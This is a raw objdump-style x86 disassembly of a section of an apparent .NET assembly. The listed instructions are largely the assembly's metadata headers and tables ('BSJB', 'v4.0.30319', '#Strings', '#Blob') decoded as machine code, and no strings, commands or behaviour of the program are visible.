100025bd:	2c 00                	sub    $0x0,%al
100025bf:	00 0a                	add    %cl,(%edx)
100025c1:	2a 5e 03             	sub    0x3(%esi),%bl
100025c4:	7e 01                	jle    0x100025c7
100025c6:	00 00                	add    %al,(%eax)
100025c8:	04 03                	add    $0x3,%al
100025ca:	6f                   	outsl  %ds:(%esi),(%dx)
100025cb:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
100025d0:	27                   	daa
100025d1:	00 00                	add    %al,(%eax)
100025d3:	0a 6f 2e             	or     0x2e(%edi),%ch
100025d6:	00 00                	add    %al,(%eax)
100025d8:	0a 2a                	or     (%edx),%ch
100025da:	5e                   	pop    %esi
100025db:	03 7e 01             	add    0x1(%esi),%edi
100025de:	00 00                	add    %al,(%eax)
100025e0:	04 03                	add    $0x3,%al
100025e2:	6f                   	outsl  %ds:(%esi),(%dx)
100025e3:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
100025e8:	27                   	daa
100025e9:	00 00                	add    %al,(%eax)
100025eb:	0a 6f 2e             	or     0x2e(%edi),%ch
100025ee:	00 00                	add    %al,(%eax)
100025f0:	0a 2a                	or     (%edx),%ch
100025f2:	1e                   	push   %ds
100025f3:	02 28                	add    (%eax),%ch
100025f5:	2c 00                	sub    $0x0,%al
100025f7:	00 0a                	add    %cl,(%edx)
100025f9:	2a 4a 02             	sub    0x2(%edx),%cl
100025fc:	7b 1b                	jnp    0x10002619
100025fe:	00 00                	add    %al,(%eax)
10002600:	04 03                	add    $0x3,%al
10002602:	28 2f                	sub    %ch,(%edi)
10002604:	00 00                	add    %al,(%eax)
10002606:	0a 6f 30             	or     0x30(%edi),%ch
10002609:	00 00                	add    %al,(%eax)
1000260b:	0a 2a                	or     (%edx),%ch
1000260d:	00 00                	add    %al,(%eax)
1000260f:	00 42 53             	add    %al,0x53(%edx)
10002612:	4a                   	dec    %edx
10002613:	42                   	inc    %edx
10002614:	01 00                	add    %eax,(%eax)
10002616:	01 00                	add    %eax,(%eax)
10002618:	00 00                	add    %al,(%eax)
1000261a:	00 00                	add    %al,(%eax)
1000261c:	0c 00                	or     $0x0,%al
1000261e:	00 00                	add    %al,(%eax)
10002620:	76 34                	jbe    0x10002656
10002622:	2e 30 2e             	xor    %ch,%cs:(%esi)
10002625:	33 30                	xor    (%eax),%esi
10002627:	33 31                	xor    (%ecx),%esi
10002629:	39 00                	cmp    %eax,(%eax)
1000262b:	00 00                	add    %al,(%eax)
1000262d:	00 05 00 6c 00 00    	add    %al,0x6c00
10002633:	00 50 06             	add    %dl,0x6(%eax)
10002636:	00 00                	add    %al,(%eax)
10002638:	23 7e 00             	and    0x0(%esi),%edi
1000263b:	00 bc 06 00 00 08 0a 	add    %bh,0xa080000(%esi,%eax,1)
10002642:	00 00                	add    %al,(%eax)
10002644:	23 53 74             	and    0x74(%ebx),%edx
10002647:	72 69                	jb     0x100026b2
10002649:	6e                   	outsb  %ds:(%esi),(%dx)
1000264a:	67 73 00             	addr16 jae 0x1000264d
1000264d:	00 00                	add    %al,(%eax)
1000264f:	00 c4                	add    %al,%ah
10002651:	10 00                	adc    %al,(%eax)
10002653:	00 3c 17             	add    %bh,(%edi,%edx,1)
10002656:	00 00                	add    %al,(%eax)
10002658:	23 55 53             	and    0x53(%ebp),%edx
1000265b:	00 00                	add    %al,(%eax)
1000265d:	28 00                	sub    %al,(%eax)
1000265f:	00 10                	add    %dl,(%eax)
10002661:	00 00                	add    %al,(%eax)
10002663:	00 23                	add    %ah,(%ebx)
10002665:	47                   	inc    %edi
10002666:	55                   	push   %ebp
10002667:	49                   	dec    %ecx
10002668:	44                   	inc    %esp
10002669:	00 00                	add    %al,(%eax)
1000266b:	00 10                	add    %dl,(%eax)
1000266d:	28 00                	sub    %al,(%eax)
1000266f:	00 9c 02 00 00 23 42 	add    %bl,0x42230000(%edx,%eax,1)
10002676:	6c                   	insb   (%dx),%es:(%edi)
10002677:	6f                   	outsl  %ds:(%esi),(%dx)
10002678:	62 00                	bound  %eax,(%eax)
1000267a:	00 00                	add    %al,(%eax)
1000267c:	00 00                	add    %al,(%eax)
1000267e:	00 00                	add    %al,(%eax)
10002680:	02 00                	add    (%eax),%al
10002682:	00 01                	add    %al,(%ecx)
10002684:	57                   	push   %edi
10002685:	15 02 1c 09 0a       	adc    $0xa091c02,%eax
1000268a:	00 00                	add    %al,(%eax)
1000268c:	00 fa                	add    %bh,%dl
1000268e:	01 33                	add    %esi,(%ebx)
10002690:	00 16                	add    %dl,(%esi)
10002692:	00 00                	add    %al,(%eax)
10002694:	01 00                	add    %eax,(%eax)
10002696:	00 00                	add    %al,(%eax)
10002698:	24 00                	and    $0x0,%al
1000269a:	00 00                	add    %al,(%eax)
1000269c:	06                   	push   %es
1000269d:	00 00                	add    %al,(%eax)
1000269f:	00 1b                	add    %bl,(%ebx)
100026a1:	00 00                	add    %al,(%eax)
100026a3:	00 12                	add    %dl,(%edx)
100026a5:	00 00                	add    %al,(%eax)
100026a7:	00 25 00 00 00 30    	add    %ah,0x30000000
100026ad:	00 00                	add    %al,(%eax)
100026af:	00 12                	add    %dl,(%edx)
100026b1:	00 00                	add    %al,(%eax)
100026b3:	00 03                	add    %al,(%ebx)
100026b5:	00 00                	add    %al,(%eax)
100026b7:	00 01                	add    %al,(%ecx)
100026b9:	00 00                	add    %al,(%eax)
100026bb:	00 03                	add    %al,(%ebx)
100026bd:	00 00                	add    %al,(%eax)
100026bf:	00 06                	add    %al,(%esi)
100026c1:	00 00                	add    %al,(%eax)
100026c3:	00 01                	add    %al,(%ecx)
100026c5:	00 00                	add    %al,(%eax)
100026c7:	00 03                	add    %al,(%ebx)
100026c9:	00 00                	add    %al,(%eax)
100026cb:	00 04 00             	add    %al,(%eax,%eax,1)
100026ce:	00 00                	add    %al,(%eax)
100026d0:	06                   	push   %es
100026d1:	00 00                	add    %al,(%eax)
100026d3:	00 00                	add    %al,(%eax)
100026d5:	00 3c 07             	add    %bh,(%edi,%eax,1)
100026d8:	01 00                	add    %eax,(%eax)
100026da:	00 00                	add    %al,(%eax)
100026dc:	00 00                	add    %al,(%eax)
100026de:	06                   	push   %es
100026df:	00 e5                	add    %ah,%ch
100026e1:	05 93 08 06 00       	add    $0x60893,%eax
100026e6:	52                   	push   %edx
100026e7:	06                   	push   %es
100026e8:	93                   	xchg   %eax,%ebx
100026e9:	08 06                	or     %al,(%esi)
100026eb:	00 19                	add    %bl,(%ecx)
100026ed:	05 61 08 0f 00       	add    $0xf0861,%eax
100026f2:	b3 08                	mov    $0x8,%bl
100026f4:	00 00                	add    %al,(%eax)
100026f6:	06                   	push   %es
100026f7:	00 41 05             	add    %al,0x5(%ecx)
100026fa:	a0 07 06 00 c8       	mov    0xc8000607,%al
100026ff:	05 a0 07 06 00       	add    $0x607a0,%eax
10002704:	a9 05 a0 07 06       	test   $0x607a005,%eax
10002709:	00 39                	add    %bh,(%ecx)
1000270b:	06                   	push   %es
1000270c:	a0 07 06 00 05       	mov    0x5000607,%al
10002711:	06                   	push   %es
10002712:	a0 07 06 00 1e       	mov    0x1e000607,%al
10002717:	06                   	push   %es
10002718:	a0 07 06 00 58       	mov    0x58000607,%al
1000271d:	05 a0 07 06 00       	add    $0x607a0,%eax
10002722:	2d 05 74 08 06       	sub    $0x6087405,%eax
10002727:	00 0b                	add    %cl,(%ebx)
10002729:	05 74 08 06 00       	add    $0x60874,%eax
1000272e:	8c 05 a0 07 06 00    	mov    %es,0x607a0
10002734:	73 05                	jae    0x1000273b
10002736:	be 06 06 00 12       	mov    $0x12000606,%esi
1000273b:	09 76 07             	or     %esi,0x7(%esi)
1000273e:	06                   	push   %es
1000273f:	00 7d 07             	add    %bh,0x7(%ebp)
10002742:	76 07                	jbe    0x1000274b
10002744:	0a 00                	or     (%eax),%al
10002746:	e4 08                	in     $0x8,%al
10002748:	61                   	popa
10002749:	08 06                	or     %al,(%esi)
1000274b:	00 bf 07 76 07 06    	add    %bh,0x6077607(%edi)
10002751:	00 f0                	add    %dh,%al
10002753:	04 93                	add    $0x93,%al
10002755:	08 06                	or     %al,(%esi)
10002757:	00 d4                	add    %dl,%ah
10002759:	04 76                	add    $0x76,%al
1000275b:	07                   	pop    %es
1000275c:	06                   	push   %es
1000275d:	00 3f                	add    %bh,(%edi)
1000275f:	01 76 07             	add    %esi,0x7(%esi)
10002762:	06                   	push   %es
10002763:	00 1c 01             	add    %bl,(%ecx,%eax,1)
10002766:	13 04 06             	adc    (%esi,%eax,1),%eax
10002769:	00 27                	add    %ah,(%edi)
1000276b:	07                   	pop    %es
1000276c:	74 08                	je     0x10002776
1000276e:	06                   	push   %es
1000276f:	00 5a 08             	add    %bl,0x8(%edx)
10002772:	76 07                	jbe    0x1000277b
10002774:	06                   	push   %es
10002775:	00 75 04             	add    %dh,0x4(%ebp)
10002778:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002779:	06                   	push   %es
1000277a:	06                   	push   %es
1000277b:	00 b5 06 2d 09 06    	add    %dh,0x6092d06(%ebp)
10002781:	00 20                	add    %ah,(%eax)
10002783:	09 76 07             	or     %esi,0x7(%esi)
10002786:	06                   	push   %es
10002787:	00 ec                	add    %ch,%ah
10002789:	06                   	push   %es
1000278a:	76 07                	jbe    0x10002793
1000278c:	0e                   	push   %cs
1000278d:	00 ab 04 fc 07 06    	add    %ch,0x607fc04(%ebx)
10002793:	00 0e                	add    %cl,(%esi)
10002795:	01 13                	add    %edx,(%ebx)
10002797:	04 06                	add    $0x6,%al
10002799:	00 d9                	add    %bl,%cl
1000279b:	09 b5 02 06 00 b2    	or     %esi,-0x4dfff9fe(%ebp)
100027a1:	07                   	pop    %es
100027a2:	b5 02                	mov    $0x2,%ch
100027a4:	06                   	push   %es
100027a5:	00 f3                	add    %dh,%bl
100027a7:	06                   	push   %es
100027a8:	b5 02                	mov    $0x2,%ch
100027aa:	06                   	push   %es
100027ab:	00 c9                	add    %cl,%cl
100027ad:	07                   	pop    %es
100027ae:	b5 02                	mov    $0x2,%ch
100027b0:	06                   	push   %es
100027b1:	00 c2                	add    %al,%dl
100027b3:	04 b5                	add    $0xb5,%al
100027b5:	02 00                	add    (%eax),%al
100027b7:	00 00                	add    %al,(%eax)
100027b9:	00 99 01 00 00 00    	add    %bl,0x1(%ecx)
100027bf:	00 01                	add    %al,(%ecx)
100027c1:	00 01                	add    %al,(%ecx)
100027c3:	00 81 01 10 00 51    	add    %al,0x51001001(%ecx)
100027c9:	03 51 03             	add    0x3(%ecx),%edx
100027cc:	41                   	inc    %ecx
100027cd:	00 01                	add    %al,(%ecx)
100027cf:	00 01                	add    %al,(%ecx)
100027d1:	00 0b                	add    %cl,(%ebx)
100027d3:	01 10                	add    %edx,(%eax)
100027d5:	00 a9 02 00 00 55    	add    %ch,0x55000002(%ecx)
100027db:	00 02                	add    %al,(%edx)
100027dd:	00 0d 00 0b 01 10    	add    %cl,0x10010b00
100027e3:	00 95 02 00 00 55    	add    %dl,0x55000002(%ebp)
100027e9:	00 14 00             	add    %dl,(%eax,%eax,1)
100027ec:	0d 00 03 21 10       	or     $0x10210300,%eax
100027f1:	00 0f                	add    %cl,(%edi)
100027f3:	04 00                	add    $0x0,%al
100027f5:	00 41 00             	add    %al,0x0(%ecx)
100027f8:	18 00                	sbb    %al,(%eax)
100027fa:	0d 00 03 01 10       	or     $0x10010300,%eax
100027ff:	00 2e                	add    %ch,(%esi)
10002801:	00 00                	add    %al,(%eax)
10002803:	00 41 00             	add    %al,0x0(%ecx)
10002806:	1b 00                	sbb    (%eax),%eax
10002808:	11 00                	adc    %eax,(%eax)
1000280a:	11 00                	adc    %eax,(%eax)
1000280c:	2e 04 31             	cs add $0x31,%al
1000280f:	01 06                	add    %eax,(%esi)
10002811:	00 03                	add    %al,(%ebx)
10002813:	04 35                	add    $0x35,%al
10002815:	01 06                	add    %eax,(%esi)
10002817:	00 af 00 38 01 06    	add    %ch,0x6013800(%edi)
1000281d:	00 03                	add    %al,(%ebx)
1000281f:	07                   	pop    %es
10002820:	38 01                	cmp    %al,(%ecx)
10002822:	06                   	push   %es
10002823:	00 ed                	add    %ch,%ch
10002825:	01 38                	add    %edi,(%eax)
10002827:	01 06                	add    %eax,(%esi)
10002829:	00 b9 03 3b 01 06    	add    %bh,0x6013b03(%ecx)
1000282f:	00 bd 03 3b 01 06    	add    %bh,0x6013b03(%ebp)
10002835:	00 23                	add    %ah,(%ebx)
10002837:	03 3b                	add    (%ebx),%edi
10002839:	01 06                	add    %eax,(%esi)
1000283b:	00 46 01             	add    %al,0x1(%esi)
1000283e:	3b 01                	cmp    (%ecx),%eax
10002840:	06                   	push   %es
10002841:	00 82 09 3b 01 06    	add    %al,0x6013b09(%edx)
10002847:	00 8e 04 3b 01 06    	add    %cl,0x6013b04(%esi)
1000284d:	00 54 07 3b          	add    %dl,0x3b(%edi,%eax,1)
10002851:	01 06                	add    %eax,(%esi)
10002853:	00 35 08 3b 01 06    	add    %dh,0x6013b08
10002859:	00 e9                	add    %ch,%cl
1000285b:	03 3e                	add    (%esi),%edi
1000285d:	01 06                	add    %eax,(%esi)
1000285f:	00 ca                	add    %cl,%dl
10002861:	01 3e                	add    %edi,(%esi)
10002863:	01 06                	add    %eax,(%esi)
10002865:	00 7a 03             	add    %bh,0x3(%edx)
10002868:	33 00                	xor    (%eax),%eax
1000286a:	06                   	push   %es
1000286b:	00 05 02 33 00 06    	add    %al,0x6003302
10002871:	00 49 09             	add    %cl,0x9(%ecx)
10002874:	33 00                	xor    (%eax),%eax
10002876:	06                   	push   %es
10002877:	00 ec                	add    %ch,%ah
10002879:	08 33                	or     %dh,(%ebx)
1000287b:	00 06                	add    %al,(%esi)
1000287d:	00 8a 06 33 00 06    	add    %cl,0x6003306(%edx)
10002883:	00 39                	add    %bh,(%ecx)
10002885:	09 33                	or     %esi,(%ebx)
10002887:	00 06                	add    %al,(%esi)
10002889:	00 20                	add    %ah,(%eax)
1000288b:	08 35 01 06 00 72    	or     %dh,0x72000601
10002891:	01 35 01 36 00 95    	add    %esi,0x95003601
10002897:	01 41 01             	add    %eax,0x1(%ecx)
1000289a:	16                   	push   %ss
1000289b:	00 7a 00             	add    %bh,0x0(%edx)
1000289e:	45                   	inc    %ebp
1000289f:	01 16                	add    %edx,(%esi)
100028a1:	00 01                	add    %al,(%ecx)
100028a3:	00 45 01             	add    %al,0x1(%ebp)
100028a6:	06                   	push   %es
100028a7:	00 2b                	add    %ch,(%ebx)
100028a9:	02 4d 01             	add    0x1(%ebp),%cl
100028ac:	00 00                	add    %al,(%eax)
100028ae:	00 00                	add    %al,(%eax)
100028b0:	80 00 91             	addb   $0x91,(%eax)
100028b3:	20 57 04             	and    %dl,0x4(%edi)
100028b6:	54                   	push   %esp
100028b7:	01 01                	add    %eax,(%ecx)
100028b9:	00 00                	add    %al,(%eax)
100028bb:	00 00                	add    %al,(%eax)
100028bd:	00 80 00 91 20 69    	add    %al,0x69209100(%eax)
100028c3:	04 5b                	add    $0x5b,%al
100028c5:	01 03                	add    %eax,(%ebx)
100028c7:	00 00                	add    %al,(%eax)
100028c9:	00 00                	add    %al,(%eax)
100028cb:	00 80 00 91 20 de    	add    %al,-0x21df6f00(%eax)
100028d1:	08 67 01             	or     %ah,0x1(%edi)
100028d4:	0a 00                	or     (%eax),%al
100028d6:	00 00                	add    %al,(%eax)
100028d8:	00 00                	add    %al,(%eax)
100028da:	80 00 91             	addb   $0x91,(%eax)
100028dd:	20 c0                	and    %al,%al
100028df:	09 79 01             	or     %edi,0x1(%ecx)
100028e2:	14 00                	adc    $0x0,%al
100028e4:	50                   	push   %eax
100028e5:	20 00                	and    %al,(%eax)
100028e7:	00 00                	add    %al,(%eax)
100028e9:	00 96 00 ef 09 84    	add    %dl,-0x7bf61100(%esi)
100028ef:	01 19                	add    %ebx,(%ecx)
100028f1:	00 00                	add    %al,(%eax)
100028f3:	00 00                	add    %al,(%eax)
100028f5:	00 80 00 91 20 73    	add    %al,0x73209100(%eax)
100028fb:	09 8b 01 1b 00 00    	or     %ecx,0x1b01(%ebx)
10002901:	00 00                	add    %al,(%eax)
10002903:	00 80 00 91 20 b6    	add    %al,-0x49df6f00(%eax)
10002909:	04 94                	add    $0x94,%al
1000290b:	01 20                	add    %esp,(%eax)
1000290d:	00 98 21 00 00 00    	add    %bl,0x21(%eax)
10002913:	00 91 00 65 07 99    	add    %dl,-0x66f89b00(%ecx)
10002919:	01 21                	add    %esp,(%ecx)
1000291b:	00 0c 22             	add    %cl,(%edx,%eiz,1)
1000291e:	00 00                	add    %al,(%eax)
10002920:	00 00                	add    %al,(%eax)
10002922:	91                   	xchg   %eax,%ecx
10002923:	00 e2                	add    %ah,%dl
10002925:	07                   	pop    %es
10002926:	99                   	cltd
10002927:	01 22                	add    %esp,(%edx)
10002929:	00 7f 22             	add    %bh,0x22(%edi)
1000292c:	00 00                	add    %al,(%eax)
1000292e:	00 00                	add    %al,(%eax)
10002930:	91                   	xchg   %eax,%ecx
10002931:	18 53 08             	sbb    %dl,0x8(%ebx)
10002934:	9e                   	sahf
10002935:	01 23                	add    %esp,(%ebx)
10002937:	00 8c 22 00 00 00 00 	add    %cl,0x0(%edx,%eiz,1)
1000293e:	93                   	xchg   %eax,%ebx
1000293f:	00 43 00             	add    %al,0x0(%ebx)
10002942:	a2 01 23 00 fc       	mov    %al,0xfc002301
10002947:	24 00                	and    $0x0,%al
10002949:	00 00                	add    %al,(%eax)
1000294b:	00 93 00 d8 00 a2    	add    %dl,-0x5dff2800(%ebx)
10002951:	01 23                	add    %esp,(%ebx)
10002953:	00 ae 25 00 00 00    	add    %ch,0x25(%esi)
10002959:	00 91 18 53 08 9e    	add    %dl,-0x61f7ace8(%ecx)
1000295f:	01 23                	add    %esp,(%ebx)
10002961:	00 ba 25 00 00 00    	add    %bh,0x25(%edx)
10002967:	00 86 18 4d 08 06    	add    %al,0x6084d18(%esi)
1000296d:	00 23                	add    %ah,(%ebx)
1000296f:	00 c2                	add    %al,%dl
10002971:	25 00 00 00 00       	and    $0x0,%eax
10002976:	83 00 83             	addl   $0xffffff83,(%eax)
10002979:	00 a6 01 23 00 da    	add    %ah,-0x25ffdcff(%esi)
1000297f:	25 00 00 00 00       	and    $0x0,%eax
10002984:	83 00 0b             	addl   $0xb,(%eax)
10002987:	00 a6 01 24 00 f2    	add    %ah,-0xdffdbff(%esi)
1000298d:	25 00 00 00 00       	and    $0x0,%eax
10002992:	86 18                	xchg   %bl,(%eax)
10002994:	4d                   	dec    %ebp
10002995:	08 06                	or     %al,(%esi)
10002997:	00 25 00 fa 25 00    	add    %ah,0x25fa00
1000299d:	00 00                	add    %al,(%eax)
1000299f:	00 83 00 23 01 ab    	add    %al,-0x54fedd00(%ebx)
100029a5:	01 25 00 00 00 01    	add    %esp,0x1000000
100029ab:	00 39                	add    %bh,(%ecx)
100029ad:	09 02                	or     %eax,(%edx)
100029af:	00 02                	add    %al,(%edx)
100029b1:	00 f0                	add    %dh,%al
100029b3:	02 00                	add    (%eax),%al
100029b5:	00 01                	add    %al,(%ecx)
100029b7:	00 8a 06 00 00 02    	add    %cl,0x2000006(%edx)
100029bd:	00 3c 03             	add    %bh,(%ebx,%eax,1)
100029c0:	00 00                	add    %al,(%eax)
100029c2:	03 00                	add    (%eax),%eax
100029c4:	c1 03 00             	roll   $0x0,(%ebx)
100029c7:	00 04 00             	add    %al,(%eax,%eax,1)
100029ca:	60                   	pusha
100029cb:	03 00                	add    (%eax),%eax
100029cd:	00 05 00 de 01 00    	add    %al,0x1de00
100029d3:	00 06                	add    %al,(%esi)
100029d5:	00 68 02             	add    %ch,0x2(%eax)
100029d8:	02 00                	add    (%eax),%al
100029da:	07                   	pop    %es
100029db:	00 14 03             	add    %dl,(%ebx,%eax,1)
100029de:	00 00                	add    %al,(%eax)
100029e0:	01 00                	add    %eax,(%eax)
100029e2:	be 00 00 00 02       	mov    $0x2000000,%esi
100029e7:	00 04 03             	add    %al,(%ebx,%eax,1)
100029ea:	00 00                	add    %al,(%eax)
100029ec:	03 00                	add    (%eax),%eax
100029ee:	8d 03                	lea    (%ebx),%eax
100029f0:	00 00                	add    %al,(%eax)
100029f2:	04 00                	add    $0x0,%al
100029f4:	3c 03                	cmp    $0x3,%al
100029f6:	00 00                	add    %al,(%eax)
100029f8:	05 00 08 08 00       	add    $0x80800,%eax
100029fd:	00 06                	add    %al,(%esi)
100029ff:	00 68 02             	add    %ch,0x2(%eax)
10002a02:	00 00                	add    %al,(%eax)
10002a04:	07                   	pop    %es
10002a05:	00 b9 01 00 00 08    	add    %bh,0x8000001(%ecx)
10002a0b:	00 d7                	add    %dl,%bh
10002a0d:	02 00                	add    (%eax),%al
10002a0f:	00 09                	add    %cl,(%ecx)
10002a11:	00 d0                	add    %dl,%al
10002a13:	03 02                	add    (%edx),%eax
10002a15:	00 0a                	add    %cl,(%edx)
10002a17:	00 a6 03 00 00 01    	add    %ah,0x1000003(%esi)
10002a1d:	00 8a 06 00 00 02    	add    %cl,0x2000006(%edx)
10002a23:	00 1c 02             	add    %bl,(%edx,%eax,1)
10002a26:	00 00                	add    %al,(%eax)
10002a28:	03 00                	add    (%eax),%eax
10002a2a:	9c                   	pushf
10002a2b:	00 00                	add    %al,(%eax)
10002a2d:	00 04 00             	add    %al,(%eax,%eax,1)
10002a30:	70 06                	jo     0x10002a38
10002a32:	02 00                	add    (%eax),%al
10002a34:	05 00 bf 02 00       	add    $0x2bf00,%eax
10002a39:	00 01                	add    %al,(%ecx)
10002a3b:	00 7d 02             	add    %bh,0x2(%ebp)
10002a3e:	00 00                	add    %al,(%eax)
10002a40:	02 00                	add    (%eax),%al
10002a42:	99                   	cltd
10002a43:	09 00                	or     %eax,(%eax)
10002a45:	00 01                	add    %al,(%ecx)
10002a47:	00 8a 06 00 00 02    	add    %cl,0x2000006(%edx)
10002a4d:	00 41 02             	add    %al,0x2(%ecx)
10002a50:	00 00                	add    %al,(%eax)
10002a52:	03 00                	add    (%eax),%eax
10002a54:	5a                   	pop    %edx
10002a55:	01 00                	add    %eax,(%eax)
10002a57:	00 04 00             	add    %al,(%eax,%eax,1)
10002a5a:	59                   	pop    %ecx
10002a5b:	02 00                	add    (%eax),%al
10002a5d:	00 05 00 a2 01 00    	add    %al,0x1a200
10002a63:	00 01                	add    %al,(%ecx)
10002a65:	00 5d 09             	add    %bl,0x9(%ebp)
10002a68:	00 00                	add    %al,(%eax)
10002a6a:	01 00                	add    %eax,(%eax)
10002a6c:	18 07                	sbb    %al,(%edi)
10002a6e:	00 00                	add    %al,(%eax)
10002a70:	01 00                	add    %eax,(%eax)
10002a72:	18 07                	sbb    %al,(%edi)
10002a74:	00 00                	add    %al,(%eax)
10002a76:	01 00                	add    %eax,(%eax)
10002a78:	ea 08 00 00 01 00 ea 	ljmp   $0xea00,$0x1000008
10002a7f:	08 00                	or     %al,(%eax)
10002a81:	00 01                	add    %al,(%ecx)
10002a83:	00 c7                	add    %al,%bh
10002a85:	04 09                	add    $0x9,%al
10002a87:	00 4d 08             	add    %cl,0x8(%ebp)
10002a8a:	01 00                	add    %eax,(%eax)
10002a8c:	11 00                	adc    %eax,(%eax)
10002a8e:	4d                   	dec    %ebp
10002a8f:	08 06                	or     %al,(%esi)
10002a91:	00 19                	add    %bl,(%ecx)
10002a93:	00 4d 08             	add    %cl,0x8(%ebp)
10002a96:	0a 00                	or     (%eax),%al
10002a98:	29 00                	sub    %eax,(%eax)
10002a9a:	4d                   	dec    %ebp
10002a9b:	08 10                	or     %dl,(%eax)
10002a9d:	00 31                	add    %dh,(%ecx)
10002a9f:	00 4d 08             	add    %cl,0x8(%ebp)
10002aa2:	10 00                	adc    %al,(%eax)
10002aa4:	39 00                	cmp    %eax,(%eax)
10002aa6:	4d                   	dec    %ebp
10002aa7:	08 10                	or     %dl,(%eax)
10002aa9:	00 41 00             	add    %al,0x0(%ecx)
10002aac:	4d                   	dec    %ebp
10002aad:	08 10                	or     %dl,(%eax)
10002aaf:	00 49 00             	add    %cl,0x0(%ecx)
10002ab2:	4d                   	dec    %ebp
10002ab3:	08 10                	or     %dl,(%eax)
10002ab5:	00 51 00             	add    %dl,0x0(%ecx)
10002ab8:	4d                   	dec    %ebp
10002ab9:	08 10                	or     %dl,(%eax)
10002abb:	00 59 00             	add    %bl,0x0(%ecx)
10002abe:	4d                   	dec    %ebp
10002abf:	08 10                	or     %dl,(%eax)
10002ac1:	00 61 00             	add    %ah,0x0(%ecx)
10002ac4:	4d                   	dec    %ebp
10002ac5:	08 15 00 69 00 4d    	or     %dl,0x4d006900
10002acb:	08 10                	or     %dl,(%eax)
10002acd:	00 71 00             	add    %dh,0x0(%ecx)
10002ad0:	4d                   	dec    %ebp
10002ad1:	08 10                	or     %dl,(%eax)
10002ad3:	00 79 00             	add    %bh,0x0(%ecx)
10002ad6:	4d                   	dec    %ebp
10002ad7:	08 10                	or     %dl,(%eax)
10002ad9:	00 a1 00 4d 08 06    	add    %ah,0x6084d00(%ecx)
10002adf:	00 c1                	add    %al,%cl
10002ae1:	00 83 06 27 00 c9    	add    %al,-0x36ffd8fa(%ebx)
10002ae7:	00 d7                	add    %dl,%bh
10002ae9:	07                   	pop    %es
10002aea:	33 00                	xor    (%eax),%eax
10002aec:	c9                   	leave
10002aed:	00 e3                	add    %ah,%bl
10002aef:	09 36                	or     %esi,(%esi)
10002af1:	00 99 00 4d 08 10    	add    %bl,0x10084d00(%ecx)
10002af7:	00 d1                	add    %dl,%cl
10002af9:	00 dc                	add    %bl,%ah
10002afb:	07                   	pop    %es
10002afc:	3c 00                	cmp    $0x0,%al
10002afe:	91                   	xchg   %eax,%ecx
10002aff:	00 48 04             	add    %cl,0x4(%eax)
10002b02:	41                   	inc    %ecx
10002b03:	00 91 00 80 04 47    	add    %dl,0x47048000(%ecx)
10002b09:	00 91 00 4f 07 06    	add    %dl,0x6074f00(%ecx)
10002b0f:	00 d9                	add    %bl,%cl
10002b11:	00 8c 01 4b 00 e1 00 	add    %cl,0xe1004b(%ecx,%eax,1)
10002b18:	d8 06                	fadds  (%esi)
10002b1a:	50                   	push   %eax
10002b1b:	00 d9                	add    %bl,%cl
10002b1d:	00 e9                	add    %ch,%cl
10002b1f:	06                   	push   %es
10002b20:	56                   	push   %esi
10002b21:	00 e9                	add    %ch,%cl
10002b23:	00 a3 04 5c 00 f1    	add    %ah,-0xeffa3fc(%ebx)
10002b29:	00 0b                	add    %cl,(%ebx)
10002b2b:	09 62 00             	or     %esp,0x0(%edx)
10002b2e:	0c 00                	or     $0x0,%al
10002b30:	4d                   	dec    %ebp
10002b31:	08 7a 00             	or     %bh,0x0(%edx)
10002b34:	f1                   	int1
10002b35:	00 19                	add    %bl,(%ecx)
10002b37:	09 80 00 f1 00 b3    	or     %eax,-0x4cff0f00(%eax)
10002b3d:	09 9d 00 e9 00 4d    	or     %ebx,0x4d00e900(%ebp)
10002b43:	08 ae 00 89 00 4d    	or     %ch,0x4d008900(%esi)
10002b49:	08 06                	or     %al,(%esi)
10002b4b:	00 14 00             	add    %dl,(%eax,%eax,1)
10002b4e:	4d                   	dec    %ebp
10002b4f:	08 06                	or     %al,(%esi)
10002b51:	00 14 00             	add    %dl,(%eax,%eax,1)
10002b54:	7c 04                	jl     0x10002b5a
10002b56:	c1 00 01             	roll   $0x1,(%eax)
10002b59:	01 c2                	add    %eax,%edx
10002b5b:	08 c7                	or     %al,%bh
10002b5d:	00 1c 00             	add    %bl,(%eax,%eax,1)
10002b60:	4d                   	dec    %ebp
10002b61:	08 7a 00             	or     %bh,0x0(%edx)
10002b64:	f1                   	int1
10002b65:	00 de                	add    %bl,%dh
10002b67:	04 d8                	add    $0xd8,%al
10002b69:	00 89 00 28 09 ef    	add    %cl,-0x10f6d800(%ecx)
10002b6f:	00 11                	add    %dl,(%ecx)
10002b71:	01 cc                	add    %ecx,%esp
10002b73:	04 f9                	add    $0xf9,%al
10002b75:	00 01                	add    %al,(%ecx)
10002b77:	01 d3                	add    %edx,%ebx
10002b79:	09 ff                	or     %edi,%edi
10002b7b:	00 e9                	add    %ch,%cl
10002b7d:	00 04 09             	add    %al,(%ecx,%ecx,1)
10002b80:	06                   	push   %es
10002b81:	01 21                	add    %esp,(%ecx)
10002b83:	01 bb 09 0d 01 81    	add    %edi,-0x7efef2f7(%ebx)
10002b89:	00 4d 08             	add    %cl,0x8(%ebp)
10002b8c:	06                   	push   %es
10002b8d:	00 e9                	add    %ch,%cl
10002b8f:	00 f8                	add    %bh,%al
10002b91:	06                   	push   %es
10002b92:	14 01                	adc    $0x1,%al
10002b94:	e9 00 d4 08 18       	jmp    0x2808ff99
10002b99:	01 11                	add    %edx,(%ecx)
10002b9b:	01 84 07 1d 01 14 00 	add    %eax,0x14011d(%edi,%eax,1)
10002ba2:	cb                   	lret
10002ba3:	08 22                	or     %ah,(%edx)
10002ba5:	01 2e                	add    %ebp,(%esi)
10002ba7:	00 0b                	add    %cl,(%ebx)
10002ba9:	00 b0 01 2e 00 13    	add    %dh,0x13002e01(%eax)
10002baf:	00 b9 01 2e 00 1b    	add    %bh,0x1b002e01(%ecx)
10002bb5:	00 d8                	add    %bl,%al
10002bb7:	01 2e                	add    %ebp,(%esi)
10002bb9:	00 23                	add    %ah,(%ebx)
10002bbb:	00 e1                	add    %ah,%cl
10002bbd:	01 2e                	add    %ebp,(%esi)
10002bbf:	00 2b                	add    %ch,(%ebx)
10002bc1:	00 f5                	add    %dh,%ch
10002bc3:	01 2e                	add    %ebp,(%esi)
10002bc5:	00 33                	add    %dh,(%ebx)
10002bc7:	00 f5                	add    %dh,%ch
10002bc9:	01 2e                	add    %ebp,(%esi)
10002bcb:	00 3b                	add    %bh,(%ebx)
10002bcd:	00 f5                	add    %dh,%ch
